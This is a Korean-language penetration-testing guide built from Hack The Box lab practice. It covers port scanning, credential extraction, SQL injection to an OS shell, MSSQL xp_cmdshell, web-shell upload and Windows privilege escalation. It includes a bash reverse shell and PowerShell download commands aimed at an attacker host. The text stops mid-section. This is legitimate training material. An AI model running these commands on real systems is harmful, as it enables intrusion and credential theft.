---
title: "Hack The Box 정리 - 표면 분석부터 root 탈취까지 도구와 옵션 가이드"
date: 2026-04-16T20:30:00+09:00
categories:
  - Web Hacking
tags:
  - Hack The Box
  - Enumeration
  - Privilege Escalation
  - Nmap
  - Burp Suite
  - SQLMap
  - Guidebook
last_modified_at: 2026-04-17T21:10:00+09:00
published: true
---
## 도구

**표면 분석**  
`nmap` `curl` `gobuster` `ffuf` `wfuzz`

**웹 분석**  
`Burp Suite` `sqlmap`

**자격증명 확보**  
`smbclient` `ftp` `zip2john` `john` `Responder`

**쉘 확보**  
`mssqlclient` `AWS CLI` `nc` `python3`

**권한 상승**  
`winPEAS` `evil-winrm` `find` `sudo`

**콜백 검증**  
`tcpdump` `Metasploit` `rogue-jndi` `mongo`

## 개요

`Hack The Box`의 단일 박스 풀이가 아니라, `Tier0 ~ Tier2` 에서 반복적으로 등장한 침투 흐름을 하나의 가이드북 형태로 묶어 정리함

정리 기준:

- `어떤 단서가 보이면 어떤 도구를 쓰는가`
- 명령어 사용 시 `왜 그 옵션을 붙였는가`
- `표면 분석 -> 초기 진입 -> 쉘 획득 -> 권한 상승` 흐름 기반

## 정리 범위

- 포트 및 서비스 식별
- 익명 접근과 파일 회수
- 요청 조작과 웹 계층 분석
- 자격증명 추출과 재사용
- DB 기반 명령 실행
- 리버스 쉘 획득과 TTY 안정화
- Windows / Linux 권한 상승
- Log4Shell / JNDI / LDAP 계열 콜백 검증

## 흐름

HTB Tier0 ~ Tier2 에서 반복적으로 보인 흐름

1. `nmap`으로 열려 있는 포트와 서비스 역할 확인
2. `smbclient`, `ftp`, `gobuster`, `ffuf`, `wfuzz`로 익명 접근과 숨은 경로 식별
3. 설정 파일, 백업 파일, 소스코드, DB, PowerShell history에서 자격증명을 확보
4. `Burp Suite`, `sqlmap`, `impacket-mssqlclient`, `mongo`로 애플리케이션과 DB를 더 깊게 분석
5. 업로드 기능, DB 명령 실행, JNDI 콜백 등을 이용해 `OS shell`을 확보
6. `python3 -c 'import pty...'`, `script /dev/null -c bash`, `evil-winrm`으로 쉘 업그레이드
7. `winPEAS`, `find`, `sudo -l`, `PATH hijacking`, `vi` shell escape로 최종 권한 상승을 시도

## 1. 연결 유지와 작업 환경

### `openvpn`

HTB VPN을 붙일 때 가장 먼저 쓰는 기본 도구

```bash
sudo openvpn <.ovpn 파일>
```

- `sudo`: TUN/TAP 인터페이스 생성에 보통 관리자 권한이 필요함
- `openvpn`: VPN 터널을 생성하는 프로그램
- `<.ovpn 파일>`: 서버 주소, 인증서, 라우팅 정보가 들어 있는 설정 파일

확인 포인트는 `tun0` 같은 인터페이스가 생겼는지임

```bash
ip a
```

정상적으로 연결되면 출력에 `tun0` 인터페이스와 `inet 10.x.x.x` 형태의 VPN IP가 보임. 여기서 중요한 값은 `tun0`의 이름과 IP이며, 이후 `tcpdump -i tun0`, `responder -I tun0`처럼 다른 도구에서 그대로 재사용

### `tmux`

실습 중에는 `listener`, `nmap`, `Burp`, `web server`, `write-up 메모`를 동시에 열어두는 경우가 많음. 세션이 끊겨도 작업을 유지하기 편하게 `tmux`사용

```bash
tmux new -s htb
tmux ls
tmux attach -t htb
```

- `new -s htb`: `htb`라는 이름의 새 세션 생성
- `ls`: 현재 세션 목록 확인
- `attach -t htb`: 끊겼던 세션에 재접속

자주 활용하는 단축키

- `Ctrl+b`, `c`: 새 창 생성
- `Ctrl+b`, `n`: 다음 창으로 이동
- `Ctrl+b`, `p`: 이전 창으로 이동
- `Ctrl+b`, `d`: 세션 분리
- `Ctrl+b`, `%`: 좌우 분할
- `Ctrl+b`, `"`: 상하 분할
- `Ctrl+b`, `[`: 터미널 코드 목록 확인 - PgUP/PgDn (tmux에서는 마우스 드래그가 안됨)

`tmux ls` 결과에서는 `htb: 1 windows` 같은 형태로 세션 이름과 창 수가 보임. 여기서 봐야 할 것은 세션 이름이며, 네트워크가 끊기더라도 `attach -t htb`로 같은 상태를 이어갈 수 있음

### `ssh` SOCKS 터널

가상환경 내에서 Burp를 사용하기 불편해서, 로컬 Burp를 사용하기 위해 설정

```bash
ssh -N -D 127.0.0.1:1080 -o ServerAliveInterval=60 kali@<PIVOT_IP>
```

- `-N`: 원격 셸을 열지 않고 터널만 유지
- `-D 127.0.0.1:1080`: 로컬 `1080` 포트를 SOCKS 프록시로 바인딩
- `-o ServerAliveInterval=60`: 60초마다 keepalive를 보내 타임아웃 방지
- `<PIVOT_IP>`: Kali에서 `ip -a` 명령어로 `192.168.56.102`형식의 ip입력

이 방식은 `Burp`, 브라우저, CLI 도구를 SOCKS 프록시에 붙여서 내부 자원에 접근할 때 사용

## 2. 포트와 서비스 식별

### `nmap`

가장 먼저 쓰는 도구. 단순히 포트가 열려 있는지 보는 것이 아니라, `다음 단계 후보를 좁히는 기준`으로 사용

#### 빠른 전체 포트 스캔

```bash
nmap -Pn -p- --min-rate 3000 --max-retries 2 -T4 <TARGET_IP>
```

- `-Pn`: 호스트가 응답하지 않아도 살아 있다고 가정하고 스캔
- `-p-`: `1~65535` 전체 TCP 포트 스캔
- `--min-rate 3000`: 초당 최소 3000개 패킷 수준으로 속도 유지
- `--max-retries 2`: 재시도 횟수 제한
- `-T4`: 공격적이지만 실습 환경에서 무난한 속도 프로파일

`무슨 서비스가 열려 있는지 빠르게 지도 그리기`

결과에서 `PORT STATE SERVICE` 표를 보면 됨. 여기서 먼저 추려낼 값은 `열린 포트 번호`, `서비스 이름`, `filtered` 여부이며, 예를 들어 `21`, `80`, `445`, `1433`, `5985` 같은 포트가 보이면 다음 도구 선택으로 바로 이어짐

#### 상세 서비스 식별

```bash
nmap -Pn -sC -sV -p 22,80,445,1433,5985 -T4 <TARGET_IP>
```

- `-sC`: 기본 NSE 스크립트 실행
- `-sV`: 서비스 버전 식별
- `-p`: 관심 포트만 다시 정밀 확인

Windows 계열 박스 예시

- `445/tcp open microsoft-ds`: SMB
- `1433/tcp open ms-sql-s`: MSSQL
- `5985/tcp open http`: WinRM 후보

Linux / 웹 계열 박스 예시

- `21/tcp open ftp`: 익명 로그인 후보
- `80/tcp open http`: 웹 초기 진입 후보
- `8080`, `8443`, `8843`, `8880`: 관리 콘솔, 프록시, 별도 애플리케이션 포트 후보

정밀 스캔 결과에서는 `Apache`, `OpenSSH`, `Microsoft SQL Server 2017`, `Microsoft-HTTPAPI/2.0`, `UniFi Network`처럼 서비스 이름과 버전이 함께 보임. 여기서 `배너 문자열`과 `버전 정보`가 중요하고, 취약점 검색과 접속 도구 선택의 기준이 됨

#### 더 공격적인 전체 스캔

```bash
nmap -sC -sV -p- --min-rate 5000 -T5 <TARGET_IP>
```

- `--min-rate 5000`: 더 빠른 속도
- `-T5`: 매우 공격적인 타이밍 템플릿

빠르지만, 지연이 크거나 패킷 손실이 있으면 포트를 놓칠 수 있음. 그래서 보통은 `빠른 스캔 -> 관심 포트 재스캔` 순서가 안정적

#### `nmap` 출력에서 먼저 보는 것

- 어떤 포트가 열려 있는가
- 그 포트가 `파일 공유`, `웹`, `DB`, `원격 관리` 중 무엇인가
- 배너에 버전이 찍히는가
- `WinRM`, `MSSQL`, `SMB`, `FTP`, `UniFi`, `Tomcat` 같은 명확한 힌트가 있는가


## 3. 익명 접근과 파일 회수

### `smbclient`

SMB가 열려 있으면 가장 먼저 `익명 열거`부터 확인

#### 공유 목록 확인

```bash
smbclient -N -L //<TARGET_IP>/
```

- `-N`: 비밀번호 없이 접속 시도
- `-L`: 공유 목록 조회

출력에서 끝에 `$`가 붙은 `ADMIN$`, `C$`는 관리용 공유인 경우가 많고, `$`가 없는 이름은 사용자가 만든 공유일 가능성이 높음

즉 이 단계에서 추려낼 값은 `공유 이름`과 `익명 접근 가능 여부`임. `backups`, `public`, `share`처럼 일반 이름이 보이면 바로 접속 대상으로 선정

#### 특정 공유에 접속

```bash
smbclient -N //<TARGET_IP>/backups
```

자주 쓰는 내부 명령

```text
dir
get <파일명>
```

- `dir`: 원격 디렉터리 목록 확인
- `get <파일명>`: 파일 다운로드

실습 중에는 설정 파일 하나에서 `DB 연결 문자열`, `서비스 계정`, `평문 비밀번호`가 바로 나온 경우가 있었음

`dir` 결과에서는 파일명과 크기를, `get` 이후에는 로컬에서 파일 내용을 바로 확인. 특히 `.config`, `.xml`, `.txt`, `.bak` 계열 파일은 연결 문자열, 계정명, `Password=` 같은 키워드가 그대로 들어 있을 가능성이 높음

#### 언제 `smbclient`를 먼저 쓰는가

- `445/tcp`가 열려 있을 때
- `nmap`에서 SMB 관련 배너가 보일 때
- Windows 박스인데 웹보다 파일 공유가 더 먼저 보일 때

### `ftp`

`21/tcp`가 열려 있으면 `anonymous` 로그인을 가장 먼저 점검

```bash
ftp <TARGET_IP>
```

로그인 예시

```text
Name: anonymous
Password: 아무 값 또는 빈 값
```

접속 후 기본 동작:

```text
ls
get backup.zip
```

실습 중에는 `backup.zip` 같은 압축 파일 하나가 그대로 노출되어 있었고, 그 안에서 추가 자격증명 단서가 이어졌음

정상 로그인되면 `230 Login successful` 같은 응답이 보이고, `ls` 결과에서는 원격 디렉터리 목록이 나옴. 여기서 봐야 할 것은 `backup.zip`, `config`, `www`, `pub`처럼 바로 회수 가치가 있는 파일명임

### `curl`

빠른 확인용: 응답 헤더, 본문 일부

```bash
curl -I http://<TARGET_IP>
curl -s http://<TARGET_IP> | grep login
```

- `-I`: 본문 없이 HTTP 헤더만 확인
- `-s`: 진행률 표시 없이 조용히 출력

이 도구는 `404 기본 페이지 크기`, `redirect 위치`, `로그인 문자열 존재 여부`를 빠르게 확인할 때 편함

`curl -I` 결과에서는 `HTTP/1.1 302 Found`, `Server: Apache/2.4.29`, `Location: /login` 같은 헤더를 확인함. `curl -s ... | grep login`은 본문 전체를 읽기 전에 `login`, `admin`, `dashboard` 같은 문자열이 실제로 존재하는지 빠르게 걸러내는 용도

## 4. 숨은 경로, 파일, 가상 호스트 찾기

### `gobuster`

웹 서버 내부 경로를 찾는 도구

#### 디렉터리 탐색

```bash
gobuster dir -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html \
  -t 30
```

- `dir`: 디렉터리/파일 브루트포스 모드
- `-u`: 대상 URL
- `-w`: 워드리스트 경로
- `-x php,txt,html`: 확장자까지 붙여 탐색
- `-t 30`: 동시 스레드 수

이 방식으로 `/uploads`, `/cdn-cgi/login`, `/admin` 류의 경로를 빠르게 찾음

결과는 보통 `path`, `Status`, `Size` 형태로 출력. 여기서 중요한 값은 `200`, `301`, `403` 같은 상태 코드와 반복되지 않는 `Size`이며, `301`은 실제 디렉터리 존재, `403`은 존재하지만 차단된 자원일 가능성을 뜻함

#### 상태 코드까지 명시해서 보기

```bash
gobuster dir -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html \
  -s 200,204,301,302,307,401,403 \
  -t 30
```

- `-s`: 보고 싶은 상태 코드만 표시

`403`도 중요한 이유는 `존재하지만 접근이 막힌 자원`일 수 있기 때문

즉 이 단계에서는 `없는 페이지를 지우는 것`보다 `다른 응답 길이와 상태 코드를 가진 경로`를 추리는 게 더 중요

#### VHost 탐색

```bash
gobuster vhost -u http://thetoppers.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

- `vhost`: 가상 호스트 탐색
- `--append-domain`: 워드리스트 단어 뒤에 기준 도메인을 붙여 완성된 호스트 이름 생성

이 방식은 `s3.thetoppers.htb`처럼 DNS가 아니라 `Host` 헤더 기반으로 분기되는 서비스에서 유효함

### `ffuf`

`gobuster`보다 필터링을 더 세밀하게 잡고 싶을 때 사용

#### 디렉터리 탐색

```bash
ffuf -u http://<TARGET_IP>/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -fc 404 \
  -c
```

- `FUZZ`: 워드리스트 값이 들어갈 자리
- `-u`: 대상 URL
- `-w`: 워드리스트
- `-fc 404`: 404 응답은 숨김
- `-c`: 컬러 출력

#### 응답 크기 기반 필터링

```bash
ffuf -u http://<TARGET_IP>/ \
  -H "Host: FUZZ.example.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 11952 \
  -t 50 \
  -timeout 5 \
  -mc all
```

- `-H`: 직접 헤더 지정
- `-fs 11952`: 길이가 `11952`인 응답은 숨김
- `-t 50`: 동시 요청 수
- `-timeout 5`: 5초 안에 응답 없으면 버림
- `-mc all`: 모든 상태 코드를 표시

유용한 상황: 기본 사이트 반복 응답 필터링

`ffuf` 결과에서는 `Status`, `Size`, `Words`, `Lines`가 같이 나옴. 여기서 가장 먼저 비교할 것은 `Size`이며, 같은 길이의 `200` 응답이 반복되면 기본 페이지일 가능성이 높고, 길이가 다르거나 `404`, `403`, `401`이 섞여 나오면 별도 가상 호스트 후보로 볼 수 있음

### `wfuzz`

`ffuf`와 비슷하지만 필터링 옵션 표현이 다름

```bash
wfuzz -u http://<TARGET_IP> \
  -H "Host: FUZZ.example.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --hh 11947
```

- `--hh 11947`: 길이가 `11947`인 응답은 숨김

같은 작업이라도 `ffuf`에서는 `-fs`, `wfuzz`에서는 `--hh`를 쓴다는 점이 다름

`wfuzz`도 결과를 `code`, `lines`, `words`, `chars`로 보여줌. 여기서는 `chars` 값이 반복되는지 먼저 보고, 반복값을 필터링한 뒤 남는 항목만 의미 있는 후보로 남김

## 5. 요청 조작과 웹 계층 확인

### `Burp Suite`

웹 문제에서는 브라우저보다 Burp를 먼저 켜는 편이 나음. `어디로 요청이 가는지`, `쿠키가 무엇인지`, `업로드 요청이 어떻게 생겼는지`를 확인해야 하기 때문

Burp 사용 지점

- 로그인 페이지 경로 확인
- `cookie`의 사용자 ID / role 값 변조
- `id` 파라미터 조작으로 IDOR 확인
- 업로드 요청 본문 직접 수정
- `sqlmap -r`용 raw request 저장

#### 예시 1. 접근 제어 우회 후보 확인

```http
GET /admin.php?content=accounts&id=1 HTTP/1.1
Host: <TARGET_IP>
Cookie: role=user; user=2233
```

`id=1`, `Cookie: user=2233` 같은 값이 있으면 다음 내용 확인

- `id`를 바꾸면 다른 사용자가 보이는가
- `Cookie`의 숫자를 관리자 계정 값으로 바꾸면 페이지가 열리는가
- `role=user`를 `admin`으로 바꾸면 기능이 추가되는가

즉 Burp는 `패킷 조작 도구`이기 전에 `신뢰 경계 확인 도구`임

응답을 비교할 때는 단순히 성공 여부만 보지 않고, `관리자 이름`, `추가 메뉴`, `업로드 버튼`, `계정 목록`처럼 화면에 새로 생기는 요소를 같이 봄. 같은 `200 OK`라도 응답 본문이 달라지면 접근 제어가 깨졌을 가능성이 있음

#### 예시 2. 업로드 요청 수정

브라우저에서 파일 업로드가 막히더라도, 요청 본문 자체를 바꾸면 우회가 가능한 경우가 있음. HTB에서는 업로드 기능 뒤에 실제 `uploads` 디렉터리가 열려 있는 케이스가 반복됨

1. 업로드 기능 존재 확인
2. 업로드 요청을 Burp로 가로챔
3. 파일명, MIME 타입, 본문 내용을 수정
4. 업로드 후 `gobuster`나 직접 접근으로 업로드 경로 확인

실제로는 `multipart/form-data` 요청 안의 `filename`, `Content-Type`, 파일 본문을 함께 보게 됨. `실제 업로드 경로가 열리는지`, `업로드 파일이 실행되는지`를 확인

## 6. 자격증명 추출과 재사용

### `zip2john`

압축 파일이 비밀번호로 보호되어 있으면 먼저 해시로 바꿔야 함

```bash
zip2john backup.zip > vaccine_hash.txt
```

- `backup.zip`: 대상 압축 파일
- `>`: 결과를 해시 파일로 저장

`zip2john`의 역할은 `크래킹`이 아니라 `크래킹 가능한 형식으로 변환`임

실행 후에는 한 줄짜리 해시가 `vaccine_hash.txt` 같은 파일에 저장됨. 이 파일 자체가 최종 결과가 아니라 `john`에 넘길 입력값

### `john`

#### 압축 파일 비밀번호 크래킹

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt vaccine_hash.txt
```

- `--wordlist`: 사전 파일 지정
- `rockyou.txt`: 가장 흔하게 쓰는 기본 사전
- `vaccine_hash.txt`: `zip2john`으로 만든 입력 파일

성공하면 출력 중간이나 마지막에 평문 비밀번호가 한 줄로 보임. 여기서 추려낼 값은 `크래킹된 평문 비밀번호`이며, 이후 `unzip`, 웹 로그인, SSH 재사용에 그대로 연결됨

#### 크래킹 결과 확인

```bash
john --show vaccine_hash.txt
```

- `--show`: 이미 크래킹된 결과만 출력

이 명령은 `backup.zip:741852963::...`처럼 `대상 파일명:평문 비밀번호` 형태를 보여줌. 여러 해시를 동시에 돌렸을 때는 이 출력이 가장 정리된 결과 확인 방식임

#### MD5 해시 크래킹

```bash
john --format=raw-md5 vaccine_admin_pw.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- `--format=raw-md5`: 솔트 없는 MD5 해시라고 명시

적용 기준: 웹 소스코드의 `md5(password)` 비교

이 경우에도 핵심 결과는 `해시 -> 평문` 매핑임. 해시 파일에 적힌 값이 어떤 계정의 값인지 같이 메모해두지 않으면, 나중에 자격증명 재사용 단계에서 혼동하기 쉬움

### `Responder`

Windows 계열 네트워크에서 UNC 경로를 열게 만들 수 있으면 NTLM 계열 해시 캡처를 시도할 수 있음

```bash
sudo responder -I tun0
```

- `-I tun0`: 캡처에 사용할 인터페이스 지정

이후 웹 애플리케이션이 `\\ATTACKER_IP\share` 같은 경로를 접근하게 만들면 인증 시도가 발생하고, 캡처한 해시는 다시 `john`으로 넘길 수 있음

성공하면 출력에 `NTLMv2-SSP Username`과 `NTLMv2-SSP Hash` 같은 줄이 보임. 여기서 바로 복사해야 하는 값은 `사용자명`과 `전체 해시 문자열`임

### 자격증명을 찾을 때 가장 먼저 보는 위치

실제 박스에서 자격증명이 나온 위치는 아래와 같음

- SMB 설정 파일
- FTP로 받은 백업 압축
- 웹 루트의 `db.php`, `index.php`
- `dashboard.php` 같은 애플리케이션 코드
- PowerShell `ConsoleHost_history.txt`
- MongoDB 내부 사용자 문서

즉 `비밀번호 크래킹`보다 먼저 `평문 또는 해시가 남아 있는 위치`를 찾는 게 우선임

## 7. DB와 애플리케이션 계층 악용

### `impacket-mssqlclient`

MSSQL 자격증명을 확보했다면 Windows 서버 내부 명령 실행까지 바로 이어질 수 있음

```bash
impacket-mssqlclient sql_svc:<PASSWORD>@<TARGET_IP> -windows-auth
```

또는 도메인 정보를 명시해도 됨

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:<PASSWORD>@<TARGET_IP> -windows-auth
```

- `-windows-auth`: SQL 인증이 아니라 Windows 인증으로 접속

정상 접속되면 `[*] ACK: Result: 1 - Microsoft SQL Server ...` 같은 배너와 함께 `SQL (...)>` 프롬프트가 뜸. 여기서 중요한 것은 `접속 성공 여부`, `서버 버전`, `현재 로그인 컨텍스트`임

#### 접속 후 유용한 내장 명령

```text
help
enable_xp_cmdshell
xp_cmdshell whoami
```

`help` 출력만으로도 다음 능력을 바로 확인할 수 있음

- `enum_db`
- `enum_logins`
- `exec_as_login`
- `xp_cmdshell`
- `upload`, `download`

즉 `mssqlclient`는 단순 SQL 콘솔이 아니라, 침투 후반까지 이어지는 운영 콘솔에 가까움

### `xp_cmdshell`

MSSQL에서 Windows 명령을 실행하는 핵심 기능임

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

우선 확인: 현재 계정, `sysadmin` 여부

```text
1 = sysadmin
0 = 일반 계정
```

판단 기준: `1`이면 `xp_cmdshell` 가능, `0`이면 우회 또는 추가 탈취 필요

#### 활성화와 테스트

```text
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell powershell
```

이후에는 `dir`, `type`, `powershell -c ...` 같은 Windows 명령을 DB 채널로 실행할 수 있음

예를 들어 `xp_cmdshell whoami` 결과에는 현재 OS 권한이, `xp_cmdshell dir ...` 결과에는 디렉터리 목록이 그대로 표 형태로 나옴. 여기서 추려낼 값은 `실행 계정`, `접근 가능한 경로`, `다운로드/업로드 가능 위치`임

#### PowerShell로 파일 다운로드

```sql
EXEC xp_cmdshell 'powershell -c "(New-Object Net.WebClient).DownloadFile(''http://<ATTACKER_IP>:8000/winPEASx64.exe'',''C:\Windows\Temp\winPEAS.exe'')"';
```

이 패턴은 `python3 -m http.server 8000`과 같이 조합해서 자주 썼음

다운로드가 성공하면 출력은 조용할 수 있으므로, 보통 바로 다음 줄에서 `dir C:\...`로 파일 존재 여부를 재확인함

### `sqlmap`

`sqlmap`은 옵션 구조를 순서대로 이해하면 훨씬 깔끔하게 쓸 수 있음

#### 1. 대상 지정

```bash
sqlmap -u "http://<TARGET_IP>/dashboard.php?search=test" --cookie="<SESSION_COOKIE>" --batch
```

- `-u`: GET 요청 대상 URL
- `--cookie`: 인증 세션 유지
- `--batch`: 자동으로 기본값 선택

탐지가 성공하면 출력에 `Parameter: search`, `Type: boolean-based blind`, `back-end DBMS: PostgreSQL`처럼 취약 파라미터와 DB 정보가 정리되어 나옴. 여기서 먼저 챙길 값은 `어느 파라미터가 취약한지`와 `DBMS 종류`임

#### 2. 특정 파라미터만 검사

```bash
sqlmap -u "http://<TARGET_IP>/dashboard.php?search=test" -p search --batch
```

- `-p search`: `search` 파라미터만 테스트

수동으로 `'`를 넣었을 때 SQL 오류가 뜨면, 어떤 파라미터가 깨지는지 짚고 `-p`로 범위를 줄이는 편이 빠름

`-p` 효과: 공격 가능 파라미터 선별

#### 3. Burp 요청 파일 사용

```bash
sqlmap -r burp_req.txt --batch
```

- `-r`: raw HTTP request 파일 사용

POST 요청, 복잡한 헤더, CSRF 토큰, 인증 세션이 있을 때는 `-u`보다 `-r`이 더 안정적임

`burp_req.txt` 확인 항목: `Cookie`, `POST body`, 필요 헤더

#### 4. DB 종류와 탐지 강도 조정

```bash
sqlmap -r burp_req.txt --dbms=PostgreSQL --level=3 --risk=2 --batch
```

- `--dbms`: 추정 DBMS 지정
- `--level`: 테스트 범위
- `--risk`: 공격 강도

예를 들어 에러 메시지에 `PostgreSQL` 힌트가 보이면 `--dbms=PostgreSQL`을 붙여 탐지 시간을 줄일 수 있음

탐지 결과가 길게 나오더라도 `back-end DBMS`, `web server`, `injection point` 세 줄만 먼저 잡으면 다음 단계 결정은 충분히 가능함

#### 5. 정보 수집

```bash
sqlmap -r burp_req.txt --dbs
sqlmap -r burp_req.txt -D <DB_NAME> --tables
sqlmap -r burp_req.txt -D <DB_NAME> -T <TABLE_NAME> --columns
sqlmap -r burp_req.txt -D <DB_NAME> -T <TABLE_NAME> -C <COL1>,<COL2> --dump
```

- `--dbs`: DB 목록
- `-D`: 특정 DB 선택
- `--tables`: 테이블 목록
- `-T`: 특정 테이블 선택
- `--columns`: 컬럼 목록
- `-C`: 특정 컬럼 선택
- `--dump`: 데이터 추출

이 단계 결과는 `available databases`, `Database: ...`, `Table: ...`, `Column: ...` 형태로 구분되어 나옴. 여기서는 모든 값을 다 읽기보다 `계정`, `비밀번호`, `토큰`, `세션`, `이메일` 같은 민감 컬럼이 어디 있는지 먼저 찾는 편이 효율적임

#### 6. 운영체제 접근

```bash
sqlmap -r burp_req.txt --os-shell --batch
```

- `--os-shell`: DB 취약점을 이용해 OS 명령 셸 시도

실습 중에는 여기서 끝내지 않고, OS shell 안에서 다시 리버스 셸을 쏴서 더 안정적인 터미널로 옮겼음

`os-shell>` 활용 범위: 환경 확인 후 reverse shell 전환

### `mongo`

애플리케이션이 MongoDB를 쓸 때는 `기본 포트가 아닐 수도 있다`는 점이 중요했음

```bash
mongo --port 27117
```

- `--port 27117`: 비표준 포트 명시

정상 접속되면 `MongoDB shell version ...`과 함께 프롬프트가 열림. 여기서 봐야 할 것은 `연결 포트`, `접속 성공 여부`, 이후 `show dbs`로 나오는 데이터베이스 이름임

접속 후 기본 흐름:

```javascript
show dbs
use ace
db.admin.find()
```

다음 단계: `ace` DB의 `admin` 컬렉션 확인
필요 시 해시 값 교체

```javascript
db.admin.update(
  { "_id": ObjectId("<TARGET_ID>") },
  { $set: { "x_shadow": "<NEW_SHA512_HASH>" } }
)
```

핵심

- `find()`는 조회
- `update()`는 수정

`db.admin.find()` 결과에서는 `_id`, `name`, `email`, `x_shadow` 같은 필드를 먼저 봄. 여기서 중요한 값은 `관리자 계정의 ObjectId`와 `해시 필드 이름`임

### `mkpasswd`

MongoDB에 넣을 새 리눅스 계열 SHA-512 해시가 필요할 때 사용했음

```bash
mkpasswd -m sha-512 <NEW_PASSWORD>
```

- `-m sha-512`: 해시 알고리즘 지정

즉 `평문 비밀번호`를 바로 넣는 것이 아니라, 시스템이 기대하는 해시 형식으로 바꿔 넣는 단계가 필요함

형식 확인 기준: `$6$` 접두어

## 8. 오브젝트 스토리지와 웹 루트 업로드

### `AWS CLI`

S3 호환 스토리지가 직접 웹 루트처럼 동작하는 박스에서는 `awscli`가 훨씬 편했음

#### 공개 버킷 목록 확인

```bash
aws s3 ls s3://thetoppers.htb --no-sign-request
```

- `s3 ls`: 버킷 목록 또는 객체 목록 조회
- `--no-sign-request`: 인증 없이 공개 접근

성공하면 `PRE images/`, `index.php`, `.htaccess` 같은 객체 목록이 나옴. 여기서는 `실행 가능한 파일`, `설정 파일`, `웹 루트 구조`를 먼저 추림

#### 커스텀 엔드포인트 사용

```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
```

- `--endpoint-url`: AWS 공식 S3가 아니라 지정한 주소를 S3 API 엔드포인트로 사용

HTB에서는 이 옵션이 중요했음. 그냥 `aws s3 ls s3://...`만 쓰면 AWS 기본 주소로 나가서 실패할 수 있기 때문임

즉 결과를 볼 때는 `요청이 실제 커스텀 스토리지로 간 것인지`와 `객체 목록이 뜨는지`를 함께 확인함

#### 파일 다운로드 / 전체 동기화 / 업로드

```bash
aws s3 cp s3://thetoppers.htb/index.php . --endpoint-url http://s3.thetoppers.htb
aws s3 sync s3://thetoppers.htb . --endpoint-url http://s3.thetoppers.htb
aws s3 cp shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

- `cp`: 단일 파일 복사
- `sync`: 전체 동기화

실습 중에는 이 흐름이 `설정/소스 회수`와 `웹쉘 업로드` 양쪽 모두에 쓰였음

재검증: `aws s3 ls ...`로 업로드 여부 확인

## 9. 쉘 획득과 안정화

### `PHP` 웹쉘 / 리버스 쉘

업로드 기능이나 웹 루트 쓰기 권한이 있으면 `코드 실행 지점`을 만들 수 있음

최소한 수정해야 하는 값은 아래 두 개임

```php
$ip = '<ATTACKER_IP>';
$port = 8888;
```

즉 서버가 내 쪽으로 연결해오게 만드는 구조임. 외부에서 서버로 직접 붙기 어렵더라도, 서버에서 공격자로 나가는 아웃바운드는 허용되는 경우가 많음

확인 포인트: 실행 위치, 연결 대상 IP/포트

### `nc` / `netcat`

리버스 쉘을 받을 때 가장 자주 쓴 명령 중 하나임

```bash
nc -lvnp 8888
```

- `-l`: listen 모드
- `-v`: verbose 출력
- `-n`: DNS 해석 없이 숫자 IP 그대로 사용
- `-p 8888`: 대기 포트 지정

다음 단계: 브라우저에서 업로드한 PHP 파일 호출 또는 OS shell 안에서 reverse shell one-liner 실행
성공 기준: 연결 유입

정상 연결되면 `connect to [ATTACKER_IP] from [TARGET_IP] ...` 같은 줄이 보임. 여기서 바로 확인할 값은 `연결해온 대상 IP`, 이후 실행한 `whoami`, `hostname`, `pwd` 결과임

### `python3 -m http.server`

도구 전달용 임시 서버로 거의 필수였음

```bash
python3 -m http.server 8000
```

대상 시스템 후속 작업: `PowerShell DownloadFile`, `curl`, `wget` 등으로 `winPEAS`, 스크립트, 바이너리 다운로드

성공 기준: `GET /winPEASx64.exe HTTP/1.1` 로그

### Python TTY 업그레이드

리버스 쉘이 뜬 직후에는 보통 `job control turned off` 상태가 많음. Python이 있으면 가장 빠르게 TTY를 안정화할 수 있음

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

이 명령은 `/bin/bash`를 pseudo-TTY로 띄워 탭 완성, 편한 입력, 보다 자연스러운 셸 동작에 도움을 줌

성공하면 프롬프트가 더 자연스럽게 바뀌고, 명령 입력이 이전보다 덜 불안정해짐. 이후 `stty rows`, `stty cols`, `export TERM=xterm` 같은 보조 설정을 붙이면 더 편해질 수 있음

### `script /dev/null -c bash`

Python이 없을 때 대체로 자주 씀

```bash
script /dev/null -c bash
```

- `script`: 터미널 세션을 기록하는 유틸리티
- `/dev/null`: 기록 파일을 버림
- `-c bash`: `bash`를 실행

즉 기록은 버리고, TTY만 개선하는 용도임

Python이 없는 환경에서 특히 유용하고, 실행 후에는 단순 `/bin/sh`보다 다루기 쉬운 `bash` 프롬프트를 얻는 경우가 많음

### Bash reverse shell 예시

`sqlmap --os-shell` 같은 제한된 셸에서 더 안정적인 접속으로 바꿀 때 많이 썼음

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/8888 0>&1'
```

이 패턴은 `nc -lvnp 8888`와 조합해 사용함

핵심: 기존 제한 셸 대신 새 연결 사용

## 10. Windows 권한 상승

### `winPEAS`

Windows 권한 상승 후보를 빠르게 훑는 자동화 스크립트임

#### 공격자 측에서 전달 준비

```bash
python3 -m http.server 8000
```

공격자 측에서는 이 서버에 실제로 요청이 들어오는지 확인해야 함. 요청 로그가 없다면 대상에서 다운로드가 실패했을 가능성이 높음

#### 대상에서 다운로드

```sql
EXEC xp_cmdshell 'powershell -c "(New-Object Net.WebClient).DownloadFile(''http://<ATTACKER_IP>:8000/winPEASx64.exe'',''C:\Users\sql_svc\Desktop\winPEAS.exe'')"';
```

#### 실행 후 결과 저장

```sql
EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\winPEAS.exe > C:\Users\sql_svc\Desktop\peas.txt';
```

#### 키워드 검색

```sql
